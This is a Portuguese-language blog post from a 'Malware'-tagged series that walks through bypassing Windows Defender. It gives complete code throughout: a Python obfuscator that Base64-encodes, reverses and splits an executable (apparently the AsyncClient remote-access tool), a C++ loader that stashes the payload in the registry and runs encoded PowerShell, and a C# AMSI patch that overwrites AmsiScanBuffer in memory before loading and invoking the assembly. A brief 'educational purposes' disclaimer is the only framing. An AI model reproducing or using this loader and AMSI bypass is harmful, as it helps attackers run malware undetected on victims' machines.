---
weight: 6
title: "Post VI: Bypassing Defender with PowerShell In-Memory Execution"
date: 2024-08-07T15:58:26+08:00
lastmod: 2024-08-07T15:58:26+08:00
draft: false
author: Vith0r
authorLink: https://github.com/Vith0r
description: Reverse Shell Simples.
images: 
resources:
  - name: featured-image
    src: Image.jpeg
tags:
  - Malware
categories:
  - Malware
lightgallery: true
toc:
  auto: false
---

Bom, neste post estarei mostrando como executar um executável na memória do PowerShell para contornar o Windows Defender.
Eu já vi várias vezes pela internet pessoas venderem Crypters que têm a capacidade de contornar o Windows Defender e
ao prestar atenção aos vídeos, na maioria das vezes percebi que o processo final quase sempre era o PowerShell, Não vou mostrar a técnica exata utilizada por crypters, mas sim uma que pode ser usada de maneira semelhante.
Então pensei, por que não escrever mais um post no meu blog mostrando como fazer isso?
Então Recomendo que você leia o post anterior [Patch-AMSI](https://vith0r.github.io/posts/patch-AMSI/) antes de continuar, pois ele será usado.

> [!warning] Warning
> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.
## PowerShell com injeção de memória?

Bom para quem não sabe, o PowerShell tem a capacidade de realizar diversas operações, incluindo a execução de código em memória.
Uma maneira simples de fazer isso é carregar um assembly diretamente na memória e invocar seu ponto de entrada.
Isso pode ser útil para uma execução furtiva, aqui está um exemplo básico de como isso pode ser feito:
### Convertendo o Executável

Primeiro, o código precisa ser convertido para um formato que possa ser carregado em memória, como Base64 para isso podemos fazer um código simples em python.
Esse código resumidamente lê o conteúdo de um arquivo, o codifica em Base64 inverte a string resultante, e divide a string invertida em várias partes menores e gera um código C++ que contém essas partes.

```python
import base64

def encode_file_to_base64(file_path):
    # Abrir o arquivo em modo binário
    with open(file_path, "rb") as file:
        # Ler o conteúdo do arquivo
        file_content = file.read()
        # Codificar o conteúdo em Base64
        base64_encoded = base64.b64encode(file_content)
        # Converter de bytes para string
        return base64_encoded.decode('utf-8')

def reverse_string(s):
    # Inverter a string
    return s[::-1]

def split_base64_string(base64_string, num_parts):
    # Calcular o tamanho de cada parte
    part_length = len(base64_string) // num_parts
    # Garantir que todas as partes tenham o tamanho apropriado
    if len(base64_string) % num_parts != 0:
        part_length += 1
    # Dividir a string em partes
    parts = [base64_string[i:i + part_length] for i in range(0, len(base64_string), part_length)]
    return parts

def save_base64_parts_to_file(base64_parts, output_path):
    # Salvar as partes Base64 em um arquivo, sem caracteres adicionais
    with open(output_path, "w") as file:
        for part in base64_parts:
            file.write(part)

def generate_cpp_code(base64_parts):
    cpp_code = ""
    part_index = 1
    for part in base64_parts:
        cpp_code += f'std::wstring part{part_index} = L"{part}";\n'
        part_index += 1
    cpp_code += "\nstd::wstring fullString = part1";
    for i in range(2, len(base64_parts) + 1):
        cpp_code += f" + part{i}"
    cpp_code += ";\n"
    return cpp_code

if __name__ == "__main__":
    # Caminho para o arquivo .exe
    file_path = "AsyncClient.exe"
    
    # Codificar o arquivo em Base64
    base64_string = encode_file_to_base64(file_path)
    
    # Inverter a string Base64
    reversed_base64_string = reverse_string(base64_string)
    
    # Dividir a string Base64 invertida em um número específico de partes
    num_parts = 40  # Ajuste o número de partes conforme necessário
    base64_parts = split_base64_string(reversed_base64_string, num_parts)
    
    # Caminho para salvar as partes Base64
    output_path = "output_base64_parts.txt"
    
    # Salvar as partes Base64 em um arquivo
    save_base64_parts_to_file(base64_parts, output_path)
    
    # Gerar código C++
    cpp_code = generate_cpp_code(base64_parts)
    
    # Caminho para salvar o código C++
    cpp_code_path = "generated_code.cpp"
    
    # Salvar o código C++ em um arquivo
    with open(cpp_code_path, "w") as file:
        file.write(cpp_code)
    
    print(f"Base64 parts saved to {output_path}")
    print(f"C++ code saved to {cpp_code_path}")

```

![](https://telegra.ph/file/8aa42aabc1b09fc7396bd.png)

## Criação do Loader
Vamos criar um código simples em C++ que escreverá nosso Base64 reverso em uma chave de registro.
e em seguida o código chamará o PowerShell para executar o base64 do `Patch-AMSI`, permitindo a execução do código responsável por carregar o assembly na memória.

---
### Escrever Valor no Registro
Essa parte do código define uma função capaz de escrever um valor em uma chave do registro do Windows.
ele usa `RegCreateKeyExW` para criar a chave se ela não existir, e `RegSetValueExW` para definir o valor da chave.

```cpp
bool WriteRegistryValue(const std::wstring& key, const std::wstring& valueName, const std::wstring& value) {
    HKEY hKey;
    LONG result = RegCreateKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (result == ERROR_SUCCESS) {
        result = RegSetValueExW(hKey, valueName.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(value.c_str()), (value.size() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    return result == ERROR_SUCCESS;
}
```

---
### Ler Valor do Registro

Já essa parte vai ler o valor da chave do registro do Windows que criamos.
para isso ele usa o `RegOpenKeyExW` para abrir a chave e `RegQueryValueExW` para obter o valor associado.

```cpp
std::wstring ReadRegistryValue(const std::wstring& key, const std::wstring& valueName) {
    HKEY hKey;
    wchar_t value[1024];
    DWORD valueLength = sizeof(value);
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, KEY_QUERY_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        result = RegQueryValueExW(hKey, valueName.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(value), &valueLength);
        RegCloseKey(hKey);
    }
    if (result == ERROR_SUCCESS) {
        return std::wstring(value, (valueLength / sizeof(wchar_t)) - 1);
    }
    return L"";
}
```

```cpp
void RunCommand(const std::wstring& command) {
    _wsystem(command.c_str());
}
```

---
### Função Principal

Agora o código main faz resumidamente o seguinte, ele vai definir as strings part1 part2... que vamos copiar do código em c++ gerado.
então vai definir a chave e o valor do registro. tambem vai verificar se o valor atual do registro é diferente do valor desejado, se for diferente vai atualizar o registro.
e se o valor já estiver atualizado, exibe uma mensagem indicando isso. e por fim executa nosso comando PowerShell codificado em base64 usando a função RunCommand.

```cpp
int main() {
    std::wstring part1 = L"ABCDEVGHIJK";

    std::wstring fullString = part1;
   
    std::wstring registryKey = L"SOFTWARE\\Payload";
    std::wstring registryValueName = L"Payload";
    std::wstring registryValue = fullString;

    if (ReadRegistryValue(registryKey, registryValueName) != registryValue) {
        if (WriteRegistryValue(registryKey, registryValueName, registryValue)) {
            std::wcout << L"Valor do registro escrito com sucesso." << std::endl;
        }
        else {
            std::wcerr << L"Erro ao escrever o valor do registro." << std::endl;
        }
    }
    else {
        std::wcout << L"Valor do registro ja esta atualizado." << std::endl;
    }

    std::wstring fullCommand = L"Powershell -noexit -exec bypass -window 1 -enc ABCDE=";
    RunCommand(fullCommand);
    return 0;
}
```

---
### Carregar o código na memória

Código do PowerShell responsável por carregar o assembly em memória e executá-lo.

```powershell
# Carregamos o conteúdo da chave do registro
$assemblyBase64 = (Get-ItemProperty HKCU:\Software\Payload\).Payload

# Decodificamos a string Base64 para obter os bytes do assembly
$assemblyBytes = [Convert]::FromBase64String($assemblyBase64)

# Carregamos o assembly na memória
$assembly = [System.Reflection.Assembly]::Load($assemblyBytes)

# Invocamos o ponto de entrada do assembly
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, $null)
```
## Convertendo tudo em base64

Aqui vamos salvar o `Patch-AMSI` e o código do powershell responsável pela execução do assembly na memória, em um arquivo `Ps1`.

```powershell
$data = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class Program
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Run()
    {
        IntPtr lib = LoadLibrary("a"+"m"+"si."+"dll");
        IntPtr amsi = GetProcAddress(lib, "Am"+"s"+"iScan"+"B"+"uffer");
        IntPtr final = IntPtr.Add(amsi, 0x95);
        uint old = 0;
        VirtualProtect(final, (UInt32)0x1, 0x40, out old);

        Console.WriteLine(old);
        byte[] patch = new byte[] { 0x75 };

        Marshal.Copy(patch, 0, final, 1);

        VirtualProtect(final, (UInt32)0x1, old, out old);
    }
}
"@

Add-Type -TypeDefinition $data -Language CSharp
[Program]::Run()

$text = ((Get-ItemProperty HKCU:\Software\Payload\).Payload)
$text = -join $text[-1..-$text.Length]

[AppDomain]::CurrentDomain.Load([Convert]::FromBase64String($text)).EntryPoint.Invoke($Null, $Null)
```

---
### Convertendo tudo em Base64

Aqui vamos converter em base64 o nosso arquivo `Ps1`.

```powershell
$script = Get-Content -Raw -Path "script.ps1"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
$encoded | Out-File -FilePath "script_base64.txt"
```

![](https://telegra.ph/file/43315d475d738e30dbb47.png)

## Prova De Conceito:

### Sem uso do Patch-AMSI
Precisamos realizar o Patch-AMSI porque o Windows Defender detecta facilmente a execução do comando do PowerShell:

![](https://telegra.ph/file/447e7b2ef31ead608da78.png)

---
### Com uso do Patch-AMSI

![](https://telegra.ph/file/297e920827ad1deb19364.png)

---
### Testando Nosso Código Final

![](https://telegra.ph/file/652114fa3f003a8e061a7.png)